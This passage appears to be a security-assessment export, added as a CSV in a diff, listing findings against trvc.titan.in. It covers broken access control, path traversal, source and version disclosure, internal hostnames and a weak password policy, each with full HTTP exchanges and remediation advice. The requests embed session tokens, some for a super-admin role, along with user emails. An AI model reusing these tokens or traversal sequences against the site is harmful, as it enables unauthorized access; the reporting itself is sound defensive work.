@@ -1,0 +1,1598 @@
+Sr. No.,Unique Alert ID,Title,First Found Date,Found Date,Open Status,Severity,URL,Result,Description,Solution,Vector,Cvss Score,Cvss Vectore,Cwe Id,Owasp Category,Request,Response,Injected URL,Response URL,Businessrisk
+1,5589319,Failure To Restrict URL Access,30-09-2026 05:30,30-09-2026 05:30,NEW,Medium,https://trvc.titan.in/api/videos/1/stream,It was observed that the application's video streaming URL can be directly accessed and the video file can be downloaded without adequate access restrictions.,"Applications are not always protecting page requests properly. Sometimes, URL protection is managed via configuration, and the system is misconfigured. Also code level protection can be used.","Access control checks must be performed before a request to a sensitive function is granted, which ensures that the user is authorized to access that function.
+Implement server-side authorization checks before serving video content.
+Ensure only authenticated and authorized users can access each video.
+Do not rely solely on the video URL or object ID for access control.
+Use short-lived, signed URLs or access tokens for protected video resources.
+Validate that the requesting user has permission to access the requested video.
+Prevent direct access to video resources when the user is not authorized.",,5.3,AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N,File and Directory Information Exposure,A01:2025 - Broken Access Control,"GET /api/videos/1/stream HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJTdXBlciBBZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzM2NzQ2MTYyNX0.xS4qQYJV-_rjbGwdXVj78Uki25kQLm98KCyNthdJxnM
+Sec-Ch-Ua-Platform: ""Windows""
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: video
+Referer: https://trvc.titan.in/super-admin
+Range: bytes=0-
+Priority: i","HTTP/2 206 Partial Content
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: video/avi
+Content-Range: bytes 0-742477/742478
+Expires: 0
+Accept-Ranges: bytes
+Vary: Origin
+X-Request-Id: ef28befc-9dfc-4625-b3d1-f77828eb039b
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 998
+Ratelimit-Reset: 60
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Wed, 30 Sep 2026 14:06:15 GMT",https://trvc.titan.in/api/videos/1/stream,https://trvc.titan.in/api/videos/1/stream,"An attacker can directly access and download video content by accessing the exposed streaming URL. If the endpoint is intended to serve videos only to authorized users, this could allow unauthorized users to obtain protected or internal video content, potentially resulting in information disclosure and unauthorized access to application resources."
+2,5589234,Source Code Disclosure,30-09-2026 05:30,30-09-2026 05:30,NEW,Low,https://trvc.titan.in/assets/index-BmRwe1ly.js,It was observed that the application's JavaScript source code is publicly accessible and exposes internal application logic and API endpoint references.,"Source code disclosure allows a malicious user to obtain the source code of a server-side application from a webpage. The attacker can obtain deeper knowledge of the Web application logic .
+ 
+Disclosure of source code and configuration files can be devastating for a web 
+application. They usually contain database connection information like IP address, 
+port number and valid credentials. In certain cases, application test users","Remove the identified piece of source code from the page and also go through the the entire web application pages.
+Avoid exposing unnecessary sensitive implementation details in client-side JavaScript.
+Remove hardcoded internal information and unnecessary API references from production builds.
+Ensure sensitive business logic is implemented and enforced server-side.
+Apply proper authentication and authorization controls to all referenced API endpoints.
+Use production build optimization/minification where appropriate to reduce unnecessary source-code exposure.
+Review publicly accessible JavaScript bundles for sensitive information before deployment.",,3.7,AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N,Information Exposure,A02:2025 - Security Misconfiguration,"GET /assets/index-BmRwe1ly.js HTTP/2
+Host: trvc.titan.in
+Cookie: _ga=GA1.1.1530676766.1790233806; _ga_EENZGKTHN6=GS2.1.s1790242182$o3$g1$t1790242195$j47$l0$h0; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRjb3JAZ21haWwuY29tIiwibmFtZSI6IlRDT1IiLCJyb2xlIjoic3RvcmUiLCJzdG9yZU5hbWUiOiJUQ09SIiwiZXhwIjoxNzkzMzQzMzcxMTU5fQ.8KwmQxK-zFYrOIs_2qfOcxZ7viWqMy6gO_xpYJuv9wA
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: ""Windows""
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+Connection: keep-alive
+","HTTP/2 200 OK
+Cache-Control: no-cache,no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: application/javascript
+Last-Modified: Wed, 09 Sep 2026 07:19:38 GMT
+Accept-Ranges: bytes
+Etag: ""0a1b3922b40dd1:0""
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Wed, 30 Sep 2026 13:08:59 GMT
+Content-Length: 8175134",https://trvc.titan.in/assets/index-BmRwe1ly.js,https://trvc.titan.in/assets/index-BmRwe1ly.js,"An attacker can access the exposed JavaScript source code and review application logic, API endpoints, and available functionality without authentication. This may provide useful information for identifying additional attack surfaces and developing targeted attacks against the application."
+3,5589215,Directory Traversal,30-09-2026 05:30,30-09-2026 05:30,NEW,Low,https://trvc.titan.in/api/customers,It was observed that the application accepts an encoded path traversal sequence and resolves the request to an unintended /api/users endpoint.,"<p>Path traversal exploits insufficient security validation in web applications and aims to access the files from a restricted path of the system by navigating the file system of the server. This attack is also known as a ""dot dot slash"" attack or directory traversal attack.</p>","<p>Strict access control should be implemented in the web application in order to restrict access to system files.</p>
+Properly normalize and canonicalize URL paths before processing requests.
+Reject encoded and unencoded traversal sequences such as ../ and ..%2f where they are not required.
+Implement strict allowlisting for valid API endpoints.
+Apply authorization checks to the final resolved endpoint.
+Configure the web server, reverse proxy, and application framework to consistently handle encoded path separators and traversal sequences.
+Test the application against encoded, double-encoded, and alternate path normalization techniques.",,3.7,AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N,Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),A01:2025 - Broken Access Control,"GET /api/customers HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRrb3JAdGl0YW4uY28uaW4iLCJuYW1lIjoiVEtPUiIsInJvbGUiOiJzdG9yZSIsInN0b3JlTmFtZSI6IlRLT1IiLCJleHAiOjE3OTI5MTQ5ODkxNzh9.9Ree7aQiMl2-HTnaIQREgrdHSggs8ffQdSgfyp-5lBE
+Sec-Ch-Ua-Platform: ""Windows""
+X-E2ee-Client: true
+Accept: application/json, text/plain, */*
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://trvc.titan.in/store
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i","HTTP/2 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""103b-hHfBC1EWhQwFzYZiQp7E+G6m1T0""
+Vary: Origin
+X-Request-Id: 735aad74-0408-4d2c-86c0-d8d633c91d1f
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 999
+Ratelimit-Reset: 60
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Fri, 25 Sep 2026 08:31:12 GMT
+Content-Length: 4155",https://trvc.titan.in/api/customers,https://trvc.titan.in/api/customers,"An attacker may manipulate API paths to access unintended application endpoints and retrieve information exposed by those endpoints. In the observed case, the manipulated request returned the same data as the intended /api/users endpoint, which may assist an attacker in bypassing intended URL restrictions and accessing information outside the expected API route."
+4,5589189,Programming Language And Version Information Disclosure,30-09-2026 05:30,30-09-2026 05:30,NEW,Low,https://trvc.titan.in/api/customers,It was observed that the application discloses server technology and version information through the X-Powered-By: ARR/3.0 HTTP response header.,Programming language information is disclosed in HTTP headers. This information may reveal framework and version etc. It may help an attacker to look for specific version related vulnerabilities.,"Framework and versions information should be omitted where possible.
+Remove the X-Powered-By header from HTTP responses.
+Disable unnecessary server/framework version disclosure.
+Configure the web server/reverse proxy to suppress technology and version-related headers.
+Review other HTTP response headers to ensure unnecessary infrastructure information is not exposed.",,3.7,AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N,Information Exposure,A02:2025 - Security Misconfiguration,"GET /api/customers HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRrb3JAdGl0YW4uY28uaW4iLCJuYW1lIjoiVEtPUiIsInJvbGUiOiJzdG9yZSIsInN0b3JlTmFtZSI6IlRLT1IiLCJleHAiOjE3OTI5MTQ5ODkxNzh9.9Ree7aQiMl2-HTnaIQREgrdHSggs8ffQdSgfyp-5lBE
+Sec-Ch-Ua-Platform: ""Windows""
+X-E2ee-Client: true
+Accept: application/json, text/plain, */*
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://trvc.titan.in/store
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i","HTTP/2 200 OK
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""103b-hHfBC1EWhQwFzYZiQp7E+G6m1T0""
+Vary: Origin
+X-Request-Id: 735aad74-0408-4d2c-86c0-d8d633c91d1f
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 999
+Ratelimit-Reset: 60
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Fri, 25 Sep 2026 08:31:12 GMT
+Content-Length: 4155",https://trvc.titan.in/api/customers,https://trvc.titan.in/api/customers,"An attacker can use the disclosed technology and version information to identify the underlying server components and perform targeted reconnaissance. This information may help an attacker select exploits or attacks relevant to the identified technology, increasing the risk of further attacks when combined with other vulnerabilities."
+5,5589188,Internal IP Address/Hostname Exposure,30-09-2026 05:30,30-09-2026 05:30,NEW,Low,https://trvc.titan.in/login,It was observed that the application discloses internal IP addresses within the HTTP response headers/content.,"The application exposes internal IP addresses or hostnames in HTTP responses, revealing sensitive infrastructure details that should not be publicly accessible.
+Impact:
+Information Disclosure
+Network Topology Exposure: Reveals internal network structure and architecture.
+Infrastructure Mapping: Enables attackers to map internal network segments.
+Attack Surface Identification: Helps identify internal services and hosts.
+Reconnaissance Facilitation: Provides valuable information for further attacks.","Remove Internal Information: 
+Audit all HTTP responses for internal IPs and hostnames
+Remove or sanitize internal infrastructure details from responses
+Implement response filtering middleware
+Error Handling:
+Use generic error messages that don't expose internal details
+Implement centralized error handling
+Sanitize stack traces and debug information
+Configuration Review:
+Review application configuration files
+Ensure internal hostnames/IPs are not hardcoded in client-facing code
+Use environment variables for internal references
+Remove internal IP addresses, localhost references, and internal hostnames from production HTTP responses.
+Review and sanitize HTTP response headers and application configuration.
+Avoid exposing internal infrastructure details through security headers such as CSP.
+Configure separate production and development environment values.
+Review the application's Content Security Policy and remove unnecessary internal origins such as localhost.
+Verify that production responses do not expose internal network information.",.,3.7,AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N,Information Exposure,A02:2025 - Security Misconfiguration,"GET /login HTTP/2
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Im9wdG9tLWFAdGhlYnl0ZWJhbmRpdHMub25taWNyb3NvZnQuY29tIiwibmFtZSI6InNlbmlvciBvcHRvbSIsInJvbGUiOiJzZW5pb3Jfb3B0b21ldHJpc3QiLCJleHAiOjE3OTI5MTQ1Mzk1MzJ9.VFaCJK_xFHSWDK3e62Eo14Rsy0fXRLs9nqWRdIwdBVs
+Cache-Control: max-age=0
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: ""Windows""
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i","HTTP/2 200 OK
+Cache-Control: no-cache,no-cache, no-store, must-revalidate
+Pragma: no-cache
+Content-Type: text/html
+Last-Modified: Wed, 09 Sep 2026 07:19:38 GMT
+Accept-Ranges: bytes
+Etag: ""0a1b3922b40dd1:0""
+Vary: Accept-Encoding
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; media-src 'self' blob:; connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com; font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com; object-src 'none'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; worker-src 'self' blob:; child-src 'self' blob:;
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Server: 
+Date: Fri, 25 Sep 2026 07:52:19 GMT
+Content-Length: 10897",https://trvc.titan.in/login,https://trvc.titan.in/login,An attacker can use the disclosed internal IP address and infrastructure information to gather details about the application's internal network architecture. This information may assist in identifying internal services or infrastructure that could be targeted during further reconnaissance and exploitation activities.
+6,5589185,Weak Password Policy,30-09-2026 05:30,30-09-2026 05:30,NEW,Low,https://trvc.titan.in/api/users,"It was observed that the application allows users to set a weak password such as 000000, indicating insufficient password complexity requirements.","Application does not impose password policy properly, such as password complexity is not maintained, password length is not strong, history is not maintained, etc.","""The application should ensure that:
+1. Password history should be maintained.
+2. Password should contain alphanumeric characters and special characters as well.
+3. Password should not be same as userid.""
+Enforce a minimum password length of at least 12 characters.
+Require a combination of uppercase letters, lowercase letters, numbers, and special characters.
+Prevent commonly used, predictable, and breached passwords such as 000000, 123456, and password.
+Implement server-side password validation in addition to client-side validation.
+Consider using a password-breach/blocklist service to prevent known compromised passwords.
+Apply the password policy consistently to all user roles and account-creation functionality.
+Consider implementing MFA for privileged accounts.",,3.7,AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N,Credentials Management,A07:2025 - Authentication Failures,"POST /api/users HTTP/1.1
+Host: trvc.titan.in
+Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGdtYWlsLmNvbSIsIm5hbWUiOiJTdXBlciBBZG1pbiIsInJvbGUiOiJzdXBlcl9hZG1pbiIsImV4cCI6MTc5MzM2MzE5MDE4NH0.Z3hXutGddsffeDOsjNSuDA9-y0ApTSw0Qfnkf7z0amo
+Content-Length: 231
+Sec-Ch-Ua-Platform: ""Windows""
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: ""Chromium"";v=""151"", ""Not=A?Brand"";v=""99""
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+X-E2ee-Client: true
+Accept: application/json, text/plain, */*
+Content-Type: application/json
+Origin: https://trvc.titan.in
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://trvc.titan.in/super-admin
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive","HTTP/2 201 Created
+Cache-Control: no-store, no-cache, must-revalidate, private,no-cache, no-store, must-revalidate
+Pragma: no-cache,no-cache
+Content-Type: application/json; charset=utf-8
+Expires: 0
+Etag: W/""15b-dIkNdxrsiUWVW27+Q6GX5ehiJMs""
+Vary: Origin
+X-Request-Id: a549405c-5ac7-49b5-8f0d-a49160fa13bd
+Content-Security-Policy: default-src 'self';base-uri 'self';font-src 'self' data: https://*.cdn.office.net https://*.office.net https://*.microsoft.com https://*.azure.com;form-action 'self';frame-ancestors 'none';img-src 'self' data: blob:;object-src 'none';script-src 'self' 'unsafe-inline';script-src-attr 'none';style-src 'self' 'unsafe-inline';upgrade-insecure-requests;child-src 'self' blob:;connect-src 'self' http://localhost:3001 http://localhost:5173 https://trvcstaging.titan.in https://trvc.titan.in https://titan.thebytebandits.com https://titan-dev.thebytebandits.com https://*.communication.azure.com wss://*.communication.azure.com https://*.skype.com https://*.flightproxy.skype.com wss://*.skype.com wss://*.flightproxy.skype.com https://*.communication.microsoft.com wss://*.communication.microsoft.com https://*.trouter.communication.microsoft.com wss://*.trouter.communication.microsoft.com https://*.teams.microsoft.com wss://*.teams.microsoft.com https://*.ecs.office.com https://*.config.office.net https://*.turn.azure.com wss://*.turn.azure.com;frame-src 'self' https://www.youtube.com https://youtube.com;media-src 'self' blob:;worker-src 'self' blob:
+Cross-Origin-Opener-Policy: same-origin
+Cross-Origin-Resource-Policy: same-origin
+Origin-Agent-Cluster: ?1
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-Dns-Prefetch-Control: off
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Xss-Protection: 0
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+Access-Control-Allow-Private-Network: true
+Access-Control-Allow-Origin: https://trvc.titan.in
+Access-Control-Allow-Credentials: true
+Ratelimit-Policy: 1000;w=60
+Ratelimit-Limit: 1000
+Ratelimit-Remaining: 978
+Ratelimit-Reset: 27
+X-Powered-By: ARR/3.0
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
